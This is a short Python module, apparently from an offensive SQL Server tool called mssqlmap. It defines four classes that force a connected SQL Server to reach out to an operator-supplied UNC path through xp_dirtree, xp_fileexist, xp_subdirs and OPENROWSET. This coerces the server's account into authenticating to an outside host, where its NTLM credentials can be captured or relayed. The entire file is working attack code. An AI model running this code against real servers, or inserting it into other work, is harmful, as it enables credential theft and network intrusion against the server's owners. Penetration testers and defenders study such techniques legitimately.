from mssqlmap.client import Client, VisitorModule
from mssqlmap.modules.fs import FileReader


class DirTreeCoercer(VisitorModule):
    def __init__(self, uncpath: str) -> None:
        self.uncpath = uncpath

    def invoke(self, client: Client) -> dict[str, bool]:
        client.query(f"EXEC master.sys.xp_dirtree {client.escape_string(self.uncpath)},1,1")
        return dict(ok=True)


class FileExistCoercer(VisitorModule):
    def __init__(self, uncpath: str) -> None:
        self.uncpath = uncpath

    def invoke(self, client: Client) -> dict[str, bool]:
        client.query(f"EXEC master.sys.xp_fileexist {client.escape_string(self.uncpath)}")
        return dict(ok=True)


class SubdirsCoercer(VisitorModule):
    def __init__(self, uncpath: str) -> None:
        self.uncpath = uncpath

    def invoke(self, client: Client) -> dict[str, bool]:
        client.query(f"EXEC master.sys.xp_subdirs {client.escape_string(self.uncpath)}")
        return dict(ok=True)


class OpenRowSetCoercer(VisitorModule):
    def __init__(self, uncpath: str) -> None:
        self.uncpath = uncpath

    def invoke(self, client: Client) -> dict[str, bool]:
        FileReader.openrowset(client, self.uncpath)
        return dict(ok=True)
